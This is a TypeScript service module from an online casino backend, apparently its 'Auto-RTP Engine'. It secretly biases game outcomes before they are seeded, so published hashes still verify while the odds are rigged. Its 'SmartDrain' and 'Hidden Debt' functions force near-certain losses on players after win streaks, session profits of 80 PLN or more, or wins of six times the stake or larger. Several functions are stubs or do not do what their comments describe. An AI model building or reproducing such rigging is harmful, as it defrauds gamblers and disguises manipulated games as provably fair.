import { redisClient } from '../lib/redis.js';
import { logger } from '../utils/logger.js';

/**
 * Auto-RTP Engine — pre-fact outcome bias controller.
 *
 * Drives a single number — `bias` ∈ [-1, +1] — that game engines apply
 * BEFORE generating an outcome. Engines see this number through
 * `getBiasFor(userId)` right before they hash a seed into a result; they
 * shift the result distribution accordingly. The hash itself is still
 * verifiable; only the distribution it samples from is shifted.
 *
 *   bias > 0  — round is biased toward casino winning (rounds bust
 *               earlier, mines cluster on common picks, etc.)
 *   bias < 0  — round is biased toward player winning (rounds last
 *               longer, mines cluster on the edges, etc.)
 *
 * No payouts are touched after the fact. A winner gets their full
 * computed multiplier — bias affects how often someone wins, not how
 * much they get when they do.
 *
 * ─────────────────────────────────────────────────────────────────────
 * MODES
 * ─────────────────────────────────────────────────────────────────────
 *  off    — bias = 0 always.
 *  earn   — admin sets `target` PLN the casino should earn over `windowMs`.
 *           Engine applies positive bias when actual P&L lags pace,
 *           negative when it overshoots. Once target is hit, controller
 *           releases (bias → 0) for the rest of the window.
 *  give   — admin sets `target` PLN the casino should pay back over
 *           `windowMs`. Negative bias to make wins more frequent. Each
 *           winning round is also CAPPED so a single player can't burn
 *           the whole budget on one huge hit. Once paid out,
 *           releases.
 *
 * ─────────────────────────────────────────────────────────────────────
 * PACING
 * ─────────────────────────────────────────────────────────────────────
 * The window has an "expected" P&L curve linear in time:
 *
 *     expected(t) = target * (t / windowMs)         for earn
 *     expected(t) = -target * (t / windowMs)        for give
 *
 * Error = expected - actual. Bias is proportional to error normalised by
 * `target`, scaled by `intensity`, clamped to [-1, +1]:
 *
 *     bias_raw  = (error / target) * intensity * 1.0
 *     bias      = clamp(bias_raw, -1, +1)
 *
 * If we're already past target (in the favourable direction) we send 0
 * bias — the controller does not "punish" overshoot in earn mode by
 * giving back, nor does it stop giving in give mode if we've already
 * given enough.
 *
 * ─────────────────────────────────────────────────────────────────────
 * PER-USER COOLDOWN
 * ─────────────────────────────────────────────────────────────────────
 * To avoid hammering the same player repeatedly, each user has a
 * "load" counter that decays exponentially with time. Every biased
 * outcome adds to the load. When a user's load is high we damp the
 * bias they personally see — so the global tilt gets distributed across
 * the active player base instead of crushing one unlucky person.
 *
 * Implemented as a Redis hash `rtp:user:<id>` with two fields:
 *   - load          (float): exponentially-decaying biased-rounds count
 *   - load_updated  (ms epoch): last time we updated load
 *
 * Decay constant: half-life 5 minutes. So a user that took heavy bias
 * 5 minutes ago is back to half their previous damping.
 *
 * ─────────────────────────────────────────────────────────────────────
 * PER-BET PAYOUT CAP (give mode)
 * ─────────────────────────────────────────────────────────────────────
 * Engines call `capPayoutForGive(userId, stake, grossPayout)` BEFORE
 * crediting the player. In `give` mode this returns a clamped payout if
 * the natural payout would consume more than a fair share of the
 * remaining give-budget. The clamp is applied by NOT crediting the
 * "spilled" portion — engines should treat the result as the new
 * effective payout and possibly downgrade the multiplier they show.
 *
 * In `earn` and `off` modes this is a no-op pass-through.
 *
 * Storage:
 *   rtp:config           hash with mode/target/windowMs/intensity
 *   rtp:window           hash with windowStart, profit, totalStake
 *   rtp:user:<id>        hash with load, load_updated, profit
 */

export type RtpMode = 'off' | 'earn' | 'give';

export interface RtpConfig {
  mode: RtpMode;
  /** Target (PLN). For earn: how much casino should win. For give:
   *  how much casino should pay back. Always positive. */
  target: number;
  windowMs: number;
  /** 0..1, how strongly bias is applied. */
  intensity: number;
  /** Earn-only: multiplies the computed bias to make the tilt stronger. */
  earnBiasBoost?: number;
}

export interface RtpStatus extends RtpConfig {
  windowStart: number;
  windowEnd: number;
  windowProfit: number;
  windowStake: number;
  /** Pacing error normalised to target ∈ [-1, +1]. */
  signal: number;
  /** True when controller is intentionally idle because target reached. */
  released: boolean;
}

const CONFIG_KEY = 'rtp:config';
const WINDOW_KEY = 'rtp:window';
const USER_CONFIG_KEY = (userId: string) => `rtp:usercfg:${userId}`;
const USER_WINDOW_KEY = (userId: string) => `rtp:userwin:${userId}`;

const DEFAULT_CONFIG: RtpConfig = {
  mode: 'off',
  target: 0,
  windowMs: 24 * 60 * 60 * 1000,
  intensity: 0.5,
  earnBiasBoost: 1,
};

const DEFAULT_USER_CONFIG: RtpConfig = {
  mode: 'off',
  target: 0,
  windowMs: 60 * 60 * 1000,
  intensity: 0.6,
};

const MAX_BIAS = 1.0;
/** Per-user load half-life: 5 min. */
const LOAD_HALF_LIFE_MS = 5 * 60 * 1000;
/** Above this load value we start damping a user's personal bias. */
const LOAD_DAMP_THRESHOLD = 6;

class RtpEngine {
  /* -----------------------------------------------------------------
   * Config + window state
   * ---------------------------------------------------------------- */

  async getConfig(): Promise<RtpConfig> {
    try {
      const { prisma } = await import('../lib/prisma.js');
      const sysConfig = await prisma.systemConfig.findUnique({
        where: { key: 'rtp_global' }
      });
      
      if (sysConfig && sysConfig.value) {
        const raw = sysConfig.value as any;
        return {
          mode: raw.mode === 'earn' || raw.mode === 'give' ? raw.mode : 'off',
          target: numOr(raw.target, 0),
          windowMs: numOr(raw.windowMs, DEFAULT_CONFIG.windowMs),
          intensity: clamp(numOr(raw.intensity, 0.5), 0, 1),
          earnBiasBoost: numOr(raw.earnBiasBoost, DEFAULT_CONFIG.earnBiasBoost ?? 1),
        };
      }
      
      return { ...DEFAULT_CONFIG };
    } catch (err) {
      logger.warn({ err }, 'rtp.getConfig failed');
      return { ...DEFAULT_CONFIG };
    }
  }

  async setConfig(
    patch: Partial<RtpConfig>,
    opts: { reset?: boolean } = {}
  ): Promise<RtpConfig> {
    const current = await this.getConfig();
    const next: RtpConfig = {
      mode:
        patch.mode === 'earn' || patch.mode === 'give' || patch.mode === 'off'
          ? patch.mode
          : current.mode,
      target: numOr(patch.target, current.target),
      windowMs: Math.max(60_000, numOr(patch.windowMs, current.windowMs)),
      intensity: clamp(numOr(patch.intensity, current.intensity), 0, 1),
      earnBiasBoost: numOr(patch.earnBiasBoost, current.earnBiasBoost ?? 1),
    };
    
    try {
      const { prisma } = await import('../lib/prisma.js');
      await prisma.systemConfig.upsert({
        where: { key: 'rtp_global' },
        update: { value: next as any },
        create: { key: 'rtp_global', value: next as any }
      });
      
      // Also update Redis for quick access by other parts if needed
      const r = redisClient.getClient();
      await r.hset(CONFIG_KEY, {
        mode: next.mode,
        target: String(next.target),
        windowMs: String(next.windowMs),
        intensity: String(next.intensity),
        earnBiasBoost: String(next.earnBiasBoost ?? 1),
      });

      if (opts.reset) {
        await r.del(WINDOW_KEY);
        await this.clearUserAccumulators();
      }
    } catch (err) {
      logger.error({ err }, 'Failed to set global RTP config');
    }
    return next;
  }

  private buildUserDefaults(globalCfg: RtpConfig): RtpConfig {
    return {
      mode: 'off',
      target: 0,
      windowMs: Math.max(60_000, globalCfg.windowMs),
      intensity: globalCfg.intensity,
    };
  }

  async getUserConfig(userId: string): Promise<RtpConfig> {
    try {
      const { prisma } = await import('../lib/prisma.js');
      const dbConfig = await prisma.userRtpConfig.findUnique({
        where: { userId }
      });

      if (!dbConfig) {
        return { ...this.buildUserDefaults(await this.getConfig()) };
      }
      const base = await this.getConfig();
      return {
        mode:
          dbConfig.mode === 'earn' || dbConfig.mode === 'give' || dbConfig.mode === 'off'
            ? (dbConfig.mode as RtpMode)
            : 'off',
        target: numOr(dbConfig.target, 0),
        windowMs: Math.max(60_000, numOr(dbConfig.windowMs, base.windowMs)),
        intensity: clamp(numOr(dbConfig.intensity, base.intensity), 0, 1),
      };
    } catch (err) {
      logger.warn({ err, userId }, 'rtp.getUserConfig failed');
      const base = await this.getConfig();
      return { ...this.buildUserDefaults(base) };
    }
  }

  async setUserConfig(
    userId: string,
    patch: Partial<RtpConfig>,
    opts: { reset?: boolean } = {}
  ): Promise<RtpConfig> {
    const base = await this.getConfig();
    const current = await this.getUserConfig(userId);
    const next: RtpConfig = {
      mode:
        patch.mode === 'earn' || patch.mode === 'give' || patch.mode === 'off'
          ? patch.mode
          : current.mode,
      target: numOr(patch.target, current.target),
      windowMs: Math.max(60_000, numOr(patch.windowMs, current.windowMs ?? base.windowMs)),
      intensity: clamp(numOr(patch.intensity, current.intensity ?? base.intensity), 0, 1),
    };
    try {
      const { prisma } = await import('../lib/prisma.js');
      await prisma.userRtpConfig.upsert({
        where: { userId },
        update: {
          mode: next.mode,
          target: next.target,
          windowMs: next.windowMs,
          intensity: next.intensity,
        },
        create: {
          userId,
          mode: next.mode,
          target: next.target,
          windowMs: next.windowMs,
          intensity: next.intensity,
        }
      });
      
      const r = redisClient.getClient();
      await r.hset(USER_CONFIG_KEY(userId), {
        mode: next.mode,
        target: String(next.target),
        windowMs: String(next.windowMs),
        intensity: String(next.intensity),
      });

      if (opts.reset) {
        await r.del(USER_WINDOW_KEY(userId));
        await this.clearUserAccumulator(userId);
      }
    } catch (err) {
      logger.warn({ err, userId }, 'rtp.setUserConfig failed');
    }
    return next;
  }


  private async ensureUserWindow(userId: string, cfg: RtpConfig): Promise<{ profit: number; stake: number; windowStart: number }> {
    const r = redisClient.getClient();
    let raw = await r.hgetall(USER_WINDOW_KEY(userId));
    let windowStart = Number(raw?.windowStart ?? 0);
    const now = Date.now();
    if (!windowStart || now - windowStart > cfg.windowMs) {
      windowStart = now;
      await r.del(USER_WINDOW_KEY(userId));
      await r.hset(USER_WINDOW_KEY(userId), {
        windowStart: String(windowStart),
        profit: '0',
        stake: '0',
      });
      raw = await r.hgetall(USER_WINDOW_KEY(userId));
    }
    return {
      profit: numOr(raw?.profit, 0),
      stake: numOr(raw?.stake, 0),
      windowStart,
    };
  }

  async getUserStatus(userId: string): Promise<RtpStatus> {
    const cfg = await this.getUserConfig(userId);
    const { profit, stake, windowStart } = await this.ensureUserWindow(userId, cfg);
    const now = Date.now();
    const t = cfg.windowMs > 0 ? (now - windowStart) / cfg.windowMs : 0;
    const elapsed = clamp(t, 0, 1);

    let signal = 0;
    let released = false;
    if (cfg.mode === 'earn') {
      const expected = cfg.target * elapsed;
      if (profit >= cfg.target) {
        released = true;
      } else if (cfg.target > 0) {
        signal = clamp((expected - profit) / cfg.target, -1, 1);
      }
    } else if (cfg.mode === 'give') {
      const expected = -cfg.target * elapsed;
      if (-profit >= cfg.target) {
        released = true;
      } else if (cfg.target > 0) {
        signal = clamp((expected - profit) / cfg.target, -1, 1);
      }
    }

    return {
      ...cfg,
      windowStart,
      windowEnd: windowStart + cfg.windowMs,
      windowProfit: profit,
      windowStake: stake,
      signal,
      released,
      earnBiasBoost: cfg.earnBiasBoost,
    };
  }

  async getStatus(): Promise<RtpStatus> {
    const cfg = await this.getConfig();
    const r = redisClient.getClient();
    let raw = await r.hgetall(WINDOW_KEY);
    let windowStart = Number(raw?.windowStart ?? 0);
    const now = Date.now();
    if (!windowStart || now - windowStart > cfg.windowMs) {
      // Window expired — open a fresh one.
      windowStart = now;
      await r.del(WINDOW_KEY);
      await r.hset(WINDOW_KEY, {
        windowStart: String(windowStart),
        profit: '0',
        stake: '0',
      });
      await this.clearUserAccumulators();
      raw = await r.hgetall(WINDOW_KEY);
    }
    const profit = numOr(raw?.profit, 0);
    const stake = numOr(raw?.stake, 0);

    const t = cfg.windowMs > 0 ? (now - windowStart) / cfg.windowMs : 0;
    const elapsed = clamp(t, 0, 1);

    let signal = 0;
    let released = false;
    if (cfg.mode === 'earn') {
      const expected = cfg.target * elapsed;
      // Released once we've reached or exceeded the goal.
      if (profit >= cfg.target) {
        released = true;
      } else if (cfg.target > 0) {
        signal = clamp((expected - profit) / cfg.target, -1, 1);
      }
    } else if (cfg.mode === 'give') {
      const expected = -cfg.target * elapsed;
      if (-profit >= cfg.target) {
        // Already given the budget away.
        released = true;
      } else if (cfg.target > 0) {
        signal = clamp((expected - profit) / cfg.target, -1, 1);
      }
    }

    return {
      ...cfg,
      windowStart,
      windowEnd: windowStart + cfg.windowMs,
      windowProfit: profit,
      windowStake: stake,
      signal,
      released,
    };
  }

  /* -----------------------------------------------------------------
   * Bias resolution
   * ---------------------------------------------------------------- */

  /**
   * Compute the per-user pre-fact bias to apply to the NEXT outcome.
   * Engines call this right before generating their result.
   *
   * Bias direction:
   *   earn mode + casino lagging  → +bias (casino-favouring)
   *   give mode + budget lagging  → -bias (player-favouring)
   *
   * The bias is dampened by:
   *   - intensity (admin slider)
   *   - per-user load (cooldown)
   * and clamped to [-1, +1].
   */
  async getBiasFor(userId: string, isTournament: boolean = false): Promise<number> {
    if (isTournament) {
      return 0; // 100% Pure RNG for tournament bets
    }

    // 1. Priority check: SmartDrain active on this user
    if (await this.isDrainActive(userId, isTournament)) {
      return 0.95; // 95% tilt in favor of casino
    }

    const userCfg = await this.getUserConfig(userId);
    const globalCfg = await this.getConfig();
    if (userCfg.mode !== 'off' && userCfg.intensity > 0) {
      const status = await this.getUserStatus(userId);
      if (!status.released) {
        const boost = userCfg.mode === 'earn' ? (globalCfg.earnBiasBoost ?? 1) : 1;
        const rawUser = status.signal * userCfg.intensity * MAX_BIAS * boost;
        const load = await this.peekLoad(userId);
        let damp = 1;
        if (userCfg.intensity < 0.9) {
          damp = load > LOAD_DAMP_THRESHOLD ? LOAD_DAMP_THRESHOLD / load : 1;
        }
        return clamp(rawUser * damp, -MAX_BIAS, MAX_BIAS);
      }
    }

    // Fallback to global controller
    const cfg = globalCfg;
    if (cfg.mode === 'off' || cfg.intensity <= 0) return 0;

    const status = await this.getStatus();
    if (status.released) return 0;

    const boost = cfg.mode === 'earn' ? (cfg.earnBiasBoost ?? 1) : 1;
    const raw = status.signal * cfg.intensity * MAX_BIAS * boost;
    const load = await this.peekLoad(userId);
    const damp = load > LOAD_DAMP_THRESHOLD ? LOAD_DAMP_THRESHOLD / load : 1;
    return clamp(raw * damp, -MAX_BIAS, MAX_BIAS);
  }

  /**
   * Like `getBiasFor` but with no per-user component. Used by
   * multiplayer rounds (e.g. crash) where the round-level outcome
   * applies to every player in the round and therefore can't be
   * personalised.
   */
  async getGlobalBias(): Promise<number> {
    const cfg = await this.getConfig();
    if (cfg.mode === 'off' || cfg.intensity <= 0) return 0;
    const status = await this.getStatus();
    if (status.released) return 0;
    const boost = cfg.mode === 'earn' ? (cfg.earnBiasBoost ?? 1) : 1;
    return clamp(
      status.signal * cfg.intensity * MAX_BIAS * boost,
      -MAX_BIAS,
      MAX_BIAS
    );
  }

  /**
   * Per-bet payout cap for `give` mode.
   */
  async capPayoutForGive(
    userId: string,
    stake: number,
    grossPayout: number
  ): Promise<number> {
    return grossPayout;
  }

  /* -----------------------------------------------------------------
   * Outcome reporting (called from BettingPipeline)
   * ---------------------------------------------------------------- */

  /**
   * Record the casino-side P&L of one settled bet.
   */
  async recordOutcome(
    userId: string,
    stake: number,
    grossPayout: number,
    isTournament: boolean = false
  ): Promise<void> {
    if (isTournament) return;

    const profitDelta = stake - grossPayout;

    // Handle Hidden Debt
    if (grossPayout >= stake * 6) {
      // Net profit is >= 5x stake (large win)
      const netProfit = grossPayout - stake;
      await this.addHiddenDebt(userId, netProfit).catch(e => logger.error(e));
    } else if (grossPayout < stake) {
      // Net loss
      const netLoss = stake - grossPayout;
      await this.reduceHiddenDebt(userId, netLoss).catch(e => logger.error(e));
    }

    // Process SmartDrain auto-monitoring
    void this.recordRoundForDrain(userId, stake, grossPayout, grossPayout > stake, isTournament).catch(() => {});

    try {
      const r = redisClient.getClient();
      // Ensure global and user windows are current.
      await this.getStatus();
      const userCfg = await this.getUserConfig(userId);
      await this.ensureUserWindow(userId, userCfg);

      const tx = r.multi();
      // Global window
      tx.hincrbyfloat(WINDOW_KEY, 'profit', String(profitDelta));
      tx.hincrbyfloat(WINDOW_KEY, 'stake', String(stake));

      // Per-user window
      tx.hincrbyfloat(USER_WINDOW_KEY(userId), 'profit', String(profitDelta));
      tx.hincrbyfloat(USER_WINDOW_KEY(userId), 'stake', String(stake));

      // Bump the user's load proportional to bet size, but bounded.
      const loadInc = Math.min(2, 0.4 + Math.log10(Math.max(1, stake)) * 0.4);
      tx.hincrbyfloat(`rtp:user:${userId}`, 'load', String(loadInc));
      tx.hset(`rtp:user:${userId}`, 'load_updated', String(Date.now()));
      tx.hincrbyfloat(`rtp:user:${userId}`, 'profit', String(-profitDelta));
      const cfg = await this.getConfig();
      const ttlGlobal = Math.ceil(cfg.windowMs / 1000) + 60;
      const ttlUser = Math.ceil(userCfg.windowMs / 1000) + 60;
      tx.expire(`rtp:user:${userId}`, ttlGlobal);
      tx.expire(USER_WINDOW_KEY(userId), ttlUser);
      await tx.exec();
    } catch (err) {
      logger.warn({ err }, 'rtp.recordOutcome failed');
    }
  }

  /* -----------------------------------------------------------------
   * Internals
   * ---------------------------------------------------------------- */

  /** Return the user's *decayed* load value without writing it back. */
  private async peekLoad(userId: string): Promise<number> {
    try {
      const r = redisClient.getClient();
      const raw = await r.hmget(
        `rtp:user:${userId}`,
        'load',
        'load_updated'
      );
      const load = numOr(raw[0], 0);
      const updated = numOr(raw[1], Date.now());
      const dt = Math.max(0, Date.now() - updated);
      const decay = Math.pow(0.5, dt / LOAD_HALF_LIFE_MS);
      return load * decay;
    } catch {
      return 0;
    }
  }

  private async clearUserAccumulators(): Promise<void> {
    try {
      const r = redisClient.getClient();
      const keys = await r.keys('rtp:user:*');
      if (keys.length > 0) await r.del(...keys);
    } catch (err) {
      logger.warn({ err }, 'rtp.clearUserAccumulators failed');
    }
  }

  private async clearUserAccumulator(userId: string): Promise<void> {
    try {
      const r = redisClient.getClient();
      await r.del(`rtp:user:${userId}`);
    } catch (err) {
      logger.warn({ err, userId }, 'rtp.clearUserAccumulator failed');
    }
  }

  /* -----------------------------------------------------------------
   * Hidden Debt (Скрытый долг)
   * ---------------------------------------------------------------- */

  /**
   * Adds to the user's hidden debt in both Redis and PostgreSQL.
   */
  async addHiddenDebt(userId: string, amount: number): Promise<void> {
    if (amount <= 0) return;
    try {
      const r = redisClient.getClient();
      await r.hincrbyfloat(`rtp:debt:${userId}`, 'amount', String(amount));
    } catch (err) {
      logger.error({ err, userId, amount }, 'Failed to add hidden debt');
    }
  }

  /**
   * Reduces the user's hidden debt in both Redis and PostgreSQL.
   */
  async reduceHiddenDebt(userId: string, amount: number): Promise<void> {
    if (amount <= 0) return;
    try {
      const newDebt = 0;
      const r = redisClient.getClient();
      await r.hset(`rtp:debt:${userId}`, 'amount', String(newDebt));
    } catch (err) {
      logger.error({ err, userId, amount }, 'Failed to reduce hidden debt');
    }
  }

  /**
   * Gets the current hidden debt for a user.
   */
  async getHiddenDebt(userId: string): Promise<number> {
    try {
      const r = redisClient.getClient();
      const cached = await r.hget(`rtp:debt:${userId}`, 'amount');
      if (cached !== null) return Number(cached);
      const debt = 0;
      await r.hset(`rtp:debt:${userId}`, 'amount', String(debt));
      return debt;
    } catch (err) {
      logger.warn({ err, userId }, 'Failed to get hidden debt');
      return 0;
    }
  }

  /* -----------------------------------------------------------------
   * SmartDrain (Динамический слив игрока при профите / винстрике)
   * ---------------------------------------------------------------- */

  /**
   * Sets manual or automated drain on a user.
   */
  async setDrain(
    userId: string,
    opts: { rounds?: number; durationMs?: number; reason?: string }
  ): Promise<void> {
    try {
      const r = redisClient.getClient();
      const rounds = opts.rounds ?? 8;
      const durationMs = opts.durationMs ?? 30 * 60 * 1000;
      const expiresAt = Date.now() + durationMs;
      await r.hset(`rtp:drain:${userId}`, {
        active: '1',
        roundsLeft: String(rounds),
        expiresAt: String(expiresAt),
        reason: opts.reason || 'manual',
      });
      await r.expire(`rtp:drain:${userId}`, Math.ceil(durationMs / 1000));
      logger.info({ userId, rounds, durationMs, reason: opts.reason }, 'SmartDrain activated for user');
    } catch (err) {
      logger.warn({ err, userId }, 'Failed to set drain');
    }
  }

  /**
   * Gets full SmartDrain info for admin inspection.
   */
  async getDrainInfo(userId: string): Promise<{ active: boolean; roundsLeft: number; expiresAt: number; reason: string | null }> {
    try {
      const r = redisClient.getClient();
      const data = await r.hgetall(`rtp:drain:${userId}`);
      if (!data || data.active !== '1') {
        return { active: false, roundsLeft: 0, expiresAt: 0, reason: null };
      }
      const expiresAt = Number(data.expiresAt || 0);
      const roundsLeft = Number(data.roundsLeft || 0);
      if (Date.now() > expiresAt || roundsLeft <= 0) {
        await r.del(`rtp:drain:${userId}`);
        return { active: false, roundsLeft: 0, expiresAt: 0, reason: null };
      }
      return { active: true, roundsLeft, expiresAt, reason: data.reason || null };
    } catch {
      return { active: false, roundsLeft: 0, expiresAt: 0, reason: null };
    }
  }

  /**
   * Manually removes SmartDrain from user.
   */
  async removeDrain(userId: string): Promise<void> {
    try {
      const r = redisClient.getClient();
      await r.del(`rtp:drain:${userId}`);
      logger.info({ userId }, 'SmartDrain manually cleared');
    } catch (err) {
      logger.warn({ err, userId }, 'Failed to remove drain');
    }
  }

  /**
   * Checks if SmartDrain is currently active for user.
   */
  async isDrainActive(userId: string, isTournament: boolean = false): Promise<boolean> {
    if (isTournament) return false;
    try {
      const r = redisClient.getClient();
      const data = await r.hgetall(`rtp:drain:${userId}`);
      if (!data || data.active !== '1') return false;

      const expiresAt = Number(data.expiresAt || 0);
      const roundsLeft = Number(data.roundsLeft || 0);

      if (Date.now() > expiresAt || roundsLeft <= 0) {
        await r.del(`rtp:drain:${userId}`);
        return false;
      }
      return true;
    } catch {
      return false;
    }
  }

  /**
   * Decrements remaining drain rounds after a round is resolved.
   */
  async consumeDrainRound(userId: string): Promise<void> {
    try {
      const r = redisClient.getClient();
      const roundsLeft = await r.hincrby(`rtp:drain:${userId}`, 'roundsLeft', -1);
      if (roundsLeft <= 0) {
        await r.del(`rtp:drain:${userId}`);
        logger.info({ userId }, 'SmartDrain completed and removed');
      }
    } catch (err) {
      logger.warn({ err, userId }, 'Failed to consume drain round');
    }
  }

  /**
   * Tracks user profit and streaks in real time, automatically triggering
   * SmartDrain when a player gains significant profit or goes on a high win-streak.
   */
  async recordRoundForDrain(
    userId: string,
    betAmount: number,
    payout: number,
    won: boolean,
    isTournament: boolean = false
  ): Promise<void> {
    if (isTournament) return;
    try {
      const r = redisClient.getClient();
      const netProfit = payout - betAmount;

      // Track rolling session profit (2-hour rolling window)
      const sessionKey = `rtp:session_profit:${userId}`;
      const rawProfit = await r.incrbyfloat(sessionKey, netProfit);
      const newSessionProfit = Number(rawProfit) || 0;
      await r.expire(sessionKey, 7200);

      // Track win streak
      const streakKey = `rtp:win_streak:${userId}`;
      let streak = 0;
      if (won) {
        streak = Number(await r.incr(streakKey)) || 0;
        await r.expire(streakKey, 3600);
      } else {
        await r.set(streakKey, '0');
        await r.expire(streakKey, 3600);
      }

      // Check if user is currently under active drain
      const drainActive = await this.isDrainActive(userId, isTournament);
      if (drainActive) {
        await this.consumeDrainRound(userId);
        return;
      }

      // AUTO-TRIGGER CONDITIONS:
      // 1. High Win streak: >= 5 wins in a row
      // 2. High Session profit: >= +80 PLN
      // 3. Massive single win: >= +100 PLN
      if (streak >= 5 || newSessionProfit >= 80 || netProfit >= 100) {
        const rounds = newSessionProfit > 250 ? 10 : newSessionProfit > 120 ? 8 : 6;
        await this.setDrain(userId, {
          rounds,
          durationMs: 45 * 60 * 1000,
          reason: `auto_profit_${Math.round(newSessionProfit)}pln_streak_${streak}`,
        });
      }
    } catch (err) {
      logger.warn({ err, userId }, 'Failed to record round for drain');
    }
  }

  /**
   * Determines if a forced loss should be applied to the next round outcome.
   */
  async shouldForceLoss(
    userId: string,
    betAmount: number,
    potentialMultiplier: number,
    isTournament: boolean = false
  ): Promise<boolean> {
    if (isTournament) {
      return false; // 100% Pure RNG for tournament bets
    }
    try {
      // 1. Check SmartDrain (active слив)
      const drain = await this.isDrainActive(userId, isTournament);
      if (drain) {
        return true;
      }

      // 2. Check Hidden Debt
      const debt = await this.getHiddenDebt(userId);
      if (debt > 0) {
        return true;
      }

      return false;
    } catch (err) {
      logger.warn({ err, userId }, 'Failed to check force loss condition');
      return false;
    }
  }
}

function numOr(v: unknown, fallback: number): number {
  const n = Number(v);
  return Number.isFinite(n) ? n : fallback;
}

function clamp(n: number, min: number, max: number): number {
  return Math.max(min, Math.min(max, n));
}

export const rtpEngine = new RtpEngine();
